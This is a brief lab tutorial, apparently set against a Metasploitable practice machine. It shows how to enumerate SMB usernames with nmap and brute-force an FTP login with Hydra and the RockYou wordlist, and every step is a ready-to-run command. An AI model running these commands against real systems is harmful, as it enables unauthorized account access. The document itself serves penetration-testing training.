# Hydra Brute Force Attack using RockYou Wordlist

## Step 1: Locate rockyou wordlist

Rockyou is located in Kali Linux at:

/usr/share/wordlists/

Check using:

ls /usr/share/wordlists/

You will see:

rockyou.txt.gz

---

## Step 2: Extract rockyou.txt

Run:

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

Now rockyou.txt is ready.

---

## Step 3: Enumerate usernames from target system

Run:

nmap --script=smb-enum-users.nse -p 445 10.0.2.9 | grep "Full name" | cut -d " " -f 10 > users.txt

This creates users.txt containing usernames.

Verify:

cat users.txt

---

## Step 4: Perform brute force attack using Hydra

Run:

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.9 -o results.txt

Explanation:

- -L users.txt → username list
- -P rockyou.txt → password list
- ftp://10.0.2.9 → target FTP service
- -o results.txt → saves results

---

## Step 5: View results

cat results.txt

Example output:

login: msfadmin password: msfadmin

---

## Tools Used

- Kali Linux
- Nmap
- Hydra
- Rockyou wordlist

---

## Purpose

This process demonstrates enumeration and brute force attack techniques used in cybersecurity penetration testing labs.
